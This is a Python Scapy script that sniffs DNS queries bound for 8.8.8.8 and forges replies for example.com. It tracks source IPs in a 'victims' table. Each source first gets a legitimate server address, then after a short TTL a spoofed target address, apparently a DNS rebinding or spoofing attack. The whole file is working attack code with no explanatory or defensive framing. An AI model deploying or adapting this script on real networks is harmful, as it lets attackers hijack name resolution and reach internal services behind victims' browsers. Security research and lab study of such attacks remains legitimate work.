from scapy.all import *
import sys
srv_ip = sys.argv[1]
target_ip = sys.argv[2]
victims = {}
ttl = 7
filter = "udp port 53 and ip dst 8.8.8.8"
def forward(orig_pkt):
    print "Forwarding: " + orig_pkt[DNSQR].qname
    response = sr1(IP(dst="8.8.8.8")/UDP(sport=orig_pkt[UDP].sport)/DNS(rd=1,id=orig_pkt[DNS].id,qd=DNSQR(qname=orig_pkt[DNSQR].qname)),verbose=0)
    respPkt = IP(dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
    respPkt[DNS] = response[DNS]
    send(respPkt)
    return "Responding: " + respPkt.summary()
def handle(pkt):
    print("got",pkt.summary(),pkt['DNS Question Record'].qname if 'DNS Question Record' in pkt  else "blah")
    if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0):
        print("DNS")
        if "example.com" in pkt['DNS Question Record'].qname:
            src_ip = pkt[IP].src
            now = time.time()
            if src_ip in victims:
                if now - victims[src_ip] > ttl:
                    print("Old enough; sending fake response")
                    out_ip = target_ip
                    del victims[src_ip]
                else:
                    print("Not old enough; Sending proper response")
                    out_ip = srv_ip
            else:
                print("New; Sending proper response")
                out_ip = srv_ip
                victims[src_ip] = time.time()
            spfResp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=out_ip,ttl=ttl)/DNSRR(rrname="example.com",rdata=out_ip))
            
            send(spfResp)
            return "DNS response: " + spfResp.summary()
        else:
            pass#return forward(pkt)
    else:
        return False

sniff(filter = filter, prn=handle)
